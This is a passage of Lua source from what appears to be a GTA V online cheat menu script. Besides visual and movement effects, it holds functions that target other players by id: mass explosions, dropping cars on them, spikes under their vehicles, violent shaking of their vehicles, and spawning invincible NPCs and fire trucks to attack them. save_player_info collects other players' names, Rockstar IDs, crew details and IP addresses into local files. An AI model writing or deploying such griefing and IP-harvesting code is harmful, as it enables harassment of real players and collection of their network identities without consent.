            if PAD.IS_CONTROL_PRESSED(0, 73) then -- x
                if ENTITY.IS_ENTITY_IN_AIR(hasskateboard2) then
                    for time = 1, 18 do
                        local myrot = ENTITY.GET_ENTITY_ROTATION(hasskateboard2, 2)
                        ENTITY.SET_ENTITY_ROTATION(hasskateboard2, 0, 0, myrot.z + 20, 1, true)
                        util.yield()
                    end
                end
            end
        end
        util.yield()
    end
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
    delete_entity(hasskateboard, hasskateboard2)
end

----火箭发射
function launching_rocket()
    local hash = MISC.GET_HASH_KEY("h4_prop_h4_airmissile_01a")
    local cpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 50, 0)
    local mission = create_object(hash, cpos.x, cpos.y, cpos.z)
    ENTITY.SET_ENTITY_ROTATION(mission, 270, 0, 0, 1, true)
    util.yield(5000)

    local height = 0
    while ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(mission) < 2000 do
        if height < 0.75 then
            height = height + 0.002
        end
        local pos = ENTITY.GET_ENTITY_COORDS(mission, false)
        ENTITY.SET_ENTITY_COORDS(mission, pos.x, pos.y, pos.z + height, false, false, false, false)
        ENTITY.SET_ENTITY_ROTATION(mission, 270, 0, 0, 1, true)

        request_ptfx_asset("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('exp_air_molotov', pos.x, pos.y, pos.z+0.4, 0, 0, 0, 1.0, false, false, false, false)

        util.yield()
    end
end

----水体漩涡
function water_vortex()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),false)
    WATER.SET_DEEP_OCEAN_SCALER(0.0)
    WATER.MODIFY_WATER(pos.x, pos.y, -500000.0, 0.2)
    WATER.MODIFY_WATER(pos.x+2, pos.y, -500000.0, 0.2)
    WATER.MODIFY_WATER(pos.x, pos.y+2, -500000.0, 0.2)
    WATER.MODIFY_WATER(pos.x-2, pos.y, -500000.0, 0.2)
    WATER.MODIFY_WATER(pos.x, pos.y-2, -500000.0, 0.2)
    WATER.MODIFY_WATER(pos.x+math.random(4,10), pos.y, -500000.0, 0.2)
    WATER.MODIFY_WATER(pos.x, pos.y+math.random(4,10), -500000.0, 0.2)
    WATER.MODIFY_WATER(pos.x-math.random(4,10), pos.y, -500000.0, 0.2)
    WATER.MODIFY_WATER(pos.x, pos.y-math.random(4,10), -500000.0, 0.2)
end

----通往天堂
function To_Heaven()
    if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then 
        util.toast("请先进入载具")
        return
    end
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then 
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        local jesus_hash = util.joaat("u_m_m_jesus_01")--耶稣
        local jesus_ped = create_ped(26, jesus_hash, pos.x, pos.y, pos.z, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jesus_ped, true)

        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, 0)
        PED.SET_PED_INTO_VEHICLE(jesus_ped, vehicle, -1)
        ENTITY.SET_ENTITY_COLLISION(vehicle, false, false)
        local vel = {x = 0, y = 0, z = 10000}
        VEHICLE.SET_VEHICLE_GRAVITY(vehicle, false)
        ENTITY.SET_ENTITY_VELOCITY(vehicle, vel.x, vel.y, vel.z)
        util.yield(5000)
        ENTITY.SET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID(), 0, 0)
    end
end

----蜘蛛侠飞行
function superman_fly(on)
    local cur_pitch = 0
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local cur_yaw = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    supermand = on 
    if supermand then
        ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        camera = CAM.CREATE_CAM_WITH_PARAMS('DEFAULT_SCRIPTED_CAMERA', c.x, c.y, c.z, 0.0, 0.0, 0.0, 120, true, 0)
        CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
        request_anim_dict('skydive@freefall')
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), 'skydive@freefall', 'free_forward', 1.0, 1.0, -1, 3, 0.5, false, false, false)
    else 
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID()) 
        if support_ent ~= 0 then 
            delete_entity(support_ent)
        end
        if camera ~= 0 then 
            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
            CAM.DESTROY_CAM(camera, false) 
            camera = 0
        end
        ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
    end
    while supermand do
        local rotate_lr = -2*PAD.GET_CONTROL_NORMAL(1, 1)
        local rotate_ud =  -2*PAD.GET_CONTROL_NORMAL(2, 2)
        local lateral = PAD.GET_CONTROL_NORMAL(30, 30)
        if math.abs(cur_pitch) >= 120 then 
            rotate_lr = -rotate_lr
        end
    
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)

        cur_pitch = cur_pitch + rotate_ud * 2
        cur_yaw = cur_yaw + rotate_lr * 2
    
        local jump = PAD.IS_CONTROL_PRESSED(0, 55)
        local shift = PAD.IS_CONTROL_PRESSED(0, 21)
        if math.abs(cur_pitch) >= 360 then 
            cur_pitch = 0
        end
        if math.abs(cur_yaw) >= 360 then 
            cur_yaw = 0
        end
    
        if ENTITY.DOES_ENTITY_EXIST(support_ent) then 
            local rot = ENTITY.GET_ENTITY_ROTATION(support_ent, 1)
            ENTITY.SET_ENTITY_ROTATION(support_ent, cur_pitch, 0.0, cur_yaw, 1, true)
            ENTITY.SET_ENTITY_MAX_SPEED(support_ent, 600)
            local forward_control = PAD.IS_CONTROL_PRESSED(0, 32)
            local backward_control = PAD.IS_CONTROL_PRESSED(0, 33) 
            local vel = ENTITY.GET_ENTITY_SPEED_VECTOR(support_ent, true)

            local side_speed = vel.x
            if math.abs(side_speed) > 5 then 
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(support_ent, 0, -side_speed, 0, 0, true, true, true, true)
            end
            if forward_control then
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(support_ent, 0, 0, 600, 0, true, true, true, true)
            end
            if backward_control then
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(support_ent, 0, 0, -600, 0, true, true, true, true)
            end
            if jump then 
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(support_ent, 0, 0, 0, 600 / 2, true, true, true, true)
            end
            if shift then 
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(support_ent, 0, 0, 0, -600 / 2, true, true, true, true)
            end
            if lateral then 
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(support_ent, 0, lateral*600, 0, 0.0, true, true, true, true)
            end

            CAM.HARD_ATTACH_CAM_TO_ENTITY(camera, PLAYER.PLAYER_PED_ID(), 0.0, 0.0, 0.0, 0.0, -5.0, .0, true)
        else
            support_ent = create_object(util.joaat('IG_RoosterMcCraw'), pos.x, pos.y, pos.z)
            ENTITY.SET_ENTITY_ROTATION(support_ent, -90, 90, 90, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), support_ent, 90, 0, 0, 0, 0, 0, 0, true, false, false, true, 0, true, 0)
        end
        util.yield()
    end
end

----移除爆炸物
function remove_explosive()
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(741814745, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(-1312131151, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(-1568386805, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(2138347493, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(1672152130, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(125959754, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(-1813897027, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(615608432, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(1420407917, false)
    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(1169823560, false)
end

----软趴趴移动
function soft_moving()
    --摔倒
    PED.SET_PED_TO_RAGDOLL(PLAYER.PLAYER_PED_ID(), 2000, 2000, 0, true, true, true)

    --移动
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    if PAD.IS_CONTROL_PRESSED(0,32) then--前进
        local c2 = get_offset_from_camera(15)
        local dir = vector3.mulScalar(vector3.sub(c2, pos), 15.0)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(PLAYER.PLAYER_PED_ID(), 1, dir.x, dir.y, dir.z, false, false, false, false)
    elseif PAD.IS_CONTROL_PRESSED(0,33) then--后退
        local c2 = get_offset_from_camera(-15)
        local dir = vector3.mulScalar(vector3.sub(c2, pos), 15.0)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(PLAYER.PLAYER_PED_ID(), 1, dir.x, dir.y, dir.z, false, false, false, false)
    end
    if PAD.IS_CONTROL_PRESSED(0,34) then--左
        local c2 = get_offset_from_camera(15)
        local dir = vector3.mulScalar(vector3.sub(c2, pos), 15.0)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(PLAYER.PLAYER_PED_ID(), 1, -dir.y, dir.x, dir.z, false, false, false, false)
    elseif PAD.IS_CONTROL_PRESSED(0,35) then--右
        local c2 = get_offset_from_camera(15)
        local dir = vector3.mulScalar(vector3.sub(c2, pos), 15.0)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(PLAYER.PLAYER_PED_ID(), 1, dir.y, -dir.x, dir.z, false, false, false, false)
    end
    if PAD.IS_CONTROL_PRESSED(0,21) then--上
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(PLAYER.PLAYER_PED_ID(), 1, 0, 0, 1.0, true, false, true, true)
    elseif PAD.IS_CONTROL_PRESSED(0,36) then--下
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(PLAYER.PLAYER_PED_ID(), 1, 0, 0, -1.0, true, false, true, true)
    end
end

----死亡之眼
function dead_eye()
    if PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_ID()) then
        MISC.SET_TIME_SCALE(0.2)
        GRAPHICS.SET_TIMECYCLE_MODIFIER("LostTimeFlash")
    else
        MISC.SET_TIME_SCALE(1)
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
    end
end

----3D环绕灯
function veh_circle_light()
    local red = math.random(0, 255)
    local green = math.random(0, 255)
    local blue = math.random(0, 255)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, 2, true)
    --VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, 8)--载具大灯
    for i = 0, 1 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, false)
    end
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, 3, false)
    util.yield(100)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, 0, true)
    for i = 1, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, false)
    end
    util.yield(100)
    for i = 0, 2 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, false)
    end
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, 3, true)
    util.yield(100)
    for i = 2, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, false)
    end
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, 0, false)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, 1, true)
    util.yield(100)
end

----骑乘玩家1
function ride_player1(pid, on)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if on then
        if PLAYER.PLAYER_PED_ID() == PLAYER.GET_PLAYER_PED(pid) then return end
        ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), PLAYER.GET_PLAYER_PED(pid), 0, -0.058, 0.197, 0.595, 2.0, 1.0,1, true, true, true, false, 0, true)
        request_anim_dict("anim@heists@heist_safehouse_intro@phone_couch@male")
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "anim@heists@heist_safehouse_intro@phone_couch@male", "phone_couch_male_idle", 3.0, 2.0, -1, 3, 1.0, false, false, false)
    else
        ENTITY.DETACH_ENTITY(PLAYER.GET_PLAYER_PED(pid), false, false)
        ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), false, false)
        TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
    end
end
--骑乘玩家2
function ride_player2(pid, on)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if on then
        if PLAYER.PLAYER_PED_ID() == PLAYER.GET_PLAYER_PED(pid) then return end
        ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), PLAYER.GET_PLAYER_PED(pid), 0, 0, 0.597, 0.995, 2.0, 1.0,1, true, true, true, false, 0, true)
        request_anim_dict("timetable@jimmy@mics3_ig_15@")
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "timetable@jimmy@mics3_ig_15@", "idle_a_tracy", 3.0, 2.0, -1, 3, 1.0, false, false, false)
    else
        ENTITY.DETACH_ENTITY(PLAYER.GET_PLAYER_PED(pid), false, false)
        ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), false, false)
        TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
    end
end


----降落到玩家
function landing_on_player(pid)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -100, 100)
    local pos1 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, false, false, false, false)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), util.joaat("gadget_parachute"), 1, 0)
    while true do
        local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        local distance = Get_distance(pos1, mypos, true)
        if distance < 123 then
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PLAYER.PLAYER_PED_ID())
            return
        end
        util.yield()
    end
end

----反击敌人
function retaliate_enemy(pid)
    if ENTITY.GET_ENTITY_HEALTH(PLAYER.GET_PLAYER_PED(pid)) < 100 then
        local killer = PED.GET_PED_SOURCE_OF_DEATH(PLAYER.GET_PLAYER_PED(pid))
        if PED.IS_PED_A_PLAYER(killer) and killer ~= PLAYER.GET_PLAYER_PED(pid) then
            local pos = ENTITY.GET_ENTITY_COORDS(killer, false)
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.5, false)
        end
    end
end

----设置导航点
function set_waypoint(pid)
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 and not PLAYER.IS_PLAYER_DEAD(pid) then
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        HUD.SET_NEW_WAYPOINT(pos.x, pos.y)
        util.yield(500)
    else
        HUD.SET_WAYPOINT_OFF()
    end
end


----保存玩家信息
local SaveProfile = {
	name = "",
	rid = "",
	crew = "",
	ip = "",
}
SaveProfile.__pairs = function(tbl)--更改排序
	local k = {"name", "rid", "crew", "ip"}
	local i = 0
	local iter = function()
		i = i + 1
		if tbl[k[i]] == nil then return nil end
		return k[i], tbl[k[i]]
	end
	return iter
end
function get_player_crew(pid)
    local crew = {}
    local networkHandle = memory.alloc(104)
    local clanDesc = memory.alloc(280)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, networkHandle, 13)
    if NETWORK.NETWORK_IS_HANDLE_VALID(networkHandle, 13) and NETWORK.NETWORK_CLAN_PLAYER_GET_DESC(clanDesc, 35, networkHandle) then
        crew.icon = memory.read_int(clanDesc)
        crew.name = memory.read_string(clanDesc + 0x08)
        crew.tag = memory.read_string(clanDesc + 0x88)
        crew.rank = memory.read_string(clanDesc + 0xB0)
        crew.motto = players.clan_get_motto(pid)
        crew.alt_badge = memory.read_byte(clanDesc + 0xA0) ~= 0 and "On" or "Off"
    end
    return crew
end
function save_player_info(pid)
    local info = setmetatable({}, SaveProfile)
    info.name = PLAYER.GET_PLAYER_NAME(pid)
    info.rid = players.get_rockstar_id(pid)
    info.crew = get_player_crew(pid)
    info.ip = intToIp(players.get_connect_ip(pid))

    local content = TableToJson(info)
    local dir = filesystem.scripts_dir() .. 'daidaiScript/profiles/'..info.name..".json"
    filewrite(dir, "w+", content or 0)
    notification("~y~~bold~信息已保存", HudColour.blue)
end



----集束炸弹
function cluster_bomb(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local playerPed = PLAYER.GET_PLAYER_PED(pid)
    if playerPed ~= 0 then
        local playerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local maxExplosions = 1200 -- 最大爆炸次数
        local explosionRadius = 0.001 -- 初始爆炸半径
        local explosionRadiusStep = 0.03 -- 每次爆炸的爆炸半径增加
        
        -- 从多个方向引发爆炸
        for i = 1, maxExplosions do
            -- 每次爆炸前的延迟
            util.yield(0.000001)
            
            -- 计算每个方向的随机角度
            local angle = math.rad(math.random(0, 360))
            
            -- 根据角度和半径计算爆炸位置
            local offsetX = math.cos(angle) * explosionRadius
            local offsetY = math.sin(angle) * explosionRadius
            local explosionPos = v3(playerPos.x + offsetX, playerPos.y + offsetY, playerPos.z)
            
            FIRE.ADD_EXPLOSION(explosionPos.x, explosionPos.y, explosionPos.z, 0, 100, true, false, 0, false)
            
            -- 增加爆炸半径
            explosionRadius = explosionRadius + explosionRadiusStep
        end
        util.yield(0.001)
    end
end

----砸死
function Smashdead_player(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local coords = players.get_position(pid)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords.z = coords.z + 5
    local playerCar = PED.GET_VEHICLE_PED_IS_IN(playerPed, false)
    if playerCar > 0 then
        delete_entity(playerCar)
    end
    local carHash = util.joaat("dukes2")
    request_model(carHash)
    local car = entities.create_vehicle(carHash, coords, 0)
    ENTITY.SET_ENTITY_VISIBLE(car, false, 0)
    ENTITY.APPLY_FORCE_TO_ENTITY(car, 1, 0.0, 0.0, -65, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
end


----载具地刺
function veh_prickle(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(PLAYER.GET_PLAYER_PED(pid))
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid)) and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(vehicle) < 1.0 then
        local hash = util.joaat("xs_prop_arena_spikes_02a")
        request_model(hash)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, 0.0, 8.0, -0.38)
        local spikes = create_object(hash, pos.x, pos.y, pos.z)
        ENTITY.SET_ENTITY_HEADING(spikes, ENTITY.GET_ENTITY_HEADING(vehicle) - 180)
        util.yield(2000)
        delete_entity(spikes)
    end
end

----载具沥青
function Vehicle_asphalt(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid)) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
        local pos = ENTITY.GET_ENTITY_COORDS(veh, false)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 67, 1, true, false, 0, false)
        util.yield(100)
    end
end

----屠杀载具
function massacre_vehicle(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
    if playerVehicle ~= nil then
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local forceMultiplier = 999999.0
        request_control(playerVehicle, 3)
        for i = 1, 1000 do
            local forceX = math.random(-forceMultiplier, forceMultiplier)
            local forceY = math.random(-forceMultiplier, forceMultiplier)
            local forceZ = -forceMultiplier
            --entity.apply_force_to_entity(playerVehicle, 1, pos.x, pos.y, pos.z, forceX, forceY, forceZ, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(playerVehicle, 1, pos.x, pos.y, pos.z, forceX, forceY, forceZ, 0, true, true, true, false, true)
            util.yield(1)
        end
        util.yield(1)
    end
end

----鱼雨
local fish_tab = {}
function fish_rain()
    local hashes = {util.joaat('a_c_fish'), util.joaat('a_c_stingray')}
    local fish_hash = hashes[math.random(#hashes)]
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    c.x = c.x + math.random(-30, 30)
    c.y = c.y + math.random(-30, 30)
    c.z = c.z + 50
    local myfish = create_ped(28, fish_hash, c.x, c.y, c.z, math.random(270))
    fish_tab[#fish_tab + 1] = myfish
    ENTITY.SET_ENTITY_HEALTH(myfish, 0.0, 1)
    ENTITY.APPLY_FORCE_TO_ENTITY(myfish, 1, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, false, false, true, false, true)
    if #fish_tab > 40 then
        delete_entity(fish_tab[1])
        table.remove(fish_tab, 1)
    end
    util.yield(200)
end

----反向驾驶
function force_npc_reverse_travel()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) then 
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
            if veh ~= 0 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1) == ped then 
                request_control(ped)
                TASK.SET_DRIVE_TASK_DRIVING_STYLE(ped, 1471)
            end
        end
    end
end

----强制冻结npc
function force_freeze_npc()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
        end
    end
end
--冻结NPC
function freeze_npc()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) then
            TASK.CLEAR_PED_TASKS(ped)
        end
    end
end

----禁止走火
function block_npc_misfire()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) then
            PED.STOP_PED_WEAPON_FIRING_WHEN_DROPPED(ped)
        end
    end
end
----禁止受伤行为
function block_npc_injury()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) then
            PED.DISABLE_PED_INJURED_ON_GROUND_BEHAVIOUR(ped)
        end
    end
end

----强化NPC
function increase_npc(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_PROOFS(ped, true, true, true, true, true, true, true, true)
    PED.SET_PED_CAN_RAGDOLL(ped, false)

    PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
    PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(ped, 500.0)
    PED.SET_PED_SEEING_RANGE(ped, 500.0)
    PED.SET_PED_HEARING_RANGE(ped, 500.0)

    WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
    PED.SET_PED_SHOOT_RATE(ped, 1000.0)
    PED.SET_PED_ACCURACY(ped, 100.0)
    PED.SET_PED_CAN_BE_SHOT_IN_VEHICLE(ped, true)

    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true) -- AlwaysFight
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 12, true) -- BlindFireWhenInCover
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 27, true) -- PerfectAccuracy
    PED.SET_PED_COMBAT_MOVEMENT(ped, 2)
    PED.SET_PED_COMBAT_ABILITY(ped, 2)
    PED.SET_PED_COMBAT_RANGE(ped, 2)
    PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 1)
    PED.SET_COMBAT_FLOAT(ped, 10, 500.0)
end
--强化所有NPC
function increase_allnpc()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) then
            increase_npc(ped)
        end
    end
end


----911事件
function attacks_911()
    local pos = {x = -914.1707, y = -1164.9396, z=250}
    local plane_hash = util.joaat('jet')
    request_model(plane_hash)
    local plane = create_vehicle(plane_hash, pos.x, pos.y, pos.z, -68)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(plane)
    VEHICLE.SET_VEHICLE_ENGINE_ON(plane, true, true, false)
    VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
    VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(plane, 0.0)
    for i=1, 5 do 
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
        util.yield(1000)
    end
end

----派只雪怪
function send_snow_monster(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash = -1931041674
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), math.random(10), math.random(10), 0)
    local Peds = create_ped(4, hash, pos.x, pos.y, pos.z, 1.0)
    ENTITY.SET_ENTITY_INVINCIBLE(Peds,true)
    TASK.TASK_COMBAT_PED(Peds, PLAYER.GET_PLAYER_PED(pid), 0, 16)
end

----NPC电击玩家
function send_ped_stun(pid, index)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local weahash = {"1171102963","-624951259"}
    local pedhash = util.joaat("u_m_m_jesus_01")
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), math.random(5), math.random(5), 0)
    local Ped = create_ped(4, pedhash, pos.x, pos.y, pos.z, 1.0)
    WEAPON.GIVE_WEAPON_TO_PED(Ped, weahash[index], 9999, false, false)
    ENTITY.SET_ENTITY_INVINCIBLE(Ped,true)
    TASK.TASK_COMBAT_PED(Ped, PLAYER.GET_PLAYER_PED(pid), 0, 16)
end

----消防车攻击
function firefighter_thread(ped, p_ped, truck)
    TASK.SET_TASK_VEHICLE_CHASE_BEHAVIOR_FLAG(ped, 1, true)
    TASK.SET_TASK_VEHICLE_CHASE_IDEAL_PURSUIT_DISTANCE(ped, 10.0)
    while ped do
        if not ENTITY.DOES_ENTITY_EXIST(truck) or not ENTITY.DOES_ENTITY_EXIST(ped) or ENTITY.GET_ENTITY_HEALTH(truck) == 0 then 
            return
        end
        local ped_c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p_ped, math.random(-5,5), math.random(-5,5), 0.0)
        local c = ENTITY.GET_ENTITY_COORDS(truck)
        if Get_distance(ped_c, c, true) >= 10 then 
            ENTITY.SET_ENTITY_COORDS(truck, ped_c.x, ped_c.y, ped_c.z)
            ENTITY.SET_ENTITY_HEADING(truck, ENTITY.GET_ENTITY_HEADING(p_ped) + 90)
        end
        TASK.TASK_VEHICLE_SHOOT_AT_PED(ped, p_ped, 1.0)
        util.yield(3000)
    end
end
function Firetruck_attack(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local v_hash = util.joaat('firetruk')
    local p_hash = util.joaat("S_M_Y_Fireman_01")
    local p_ped = PLAYER.GET_PLAYER_PED(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p_ped, math.random(-5,5), math.random(-5,5), 0.0)     
    local truck = create_vehicle(v_hash, c.x, c.y, c.z, ENTITY.GET_ENTITY_HEADING(p_ped))
    VEHICLE.SET_VEHICLE_SIREN(truck, true)
    ENTITY.SET_ENTITY_HEADING(truck, ENTITY.GET_ENTITY_HEADING(p_ped) + 90)
    VEHICLE.SET_VEHICLE_ENGINE_ON(truck, true, true, false)
    VEHICLE.SET_VEHICLE_WEAPON_CAN_TARGET_OBJECTS(truck, true)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 2)
    local ped = create_ped(1, p_hash, c.x, c.y, c.z, ENTITY.GET_ENTITY_HEADING(p_ped))
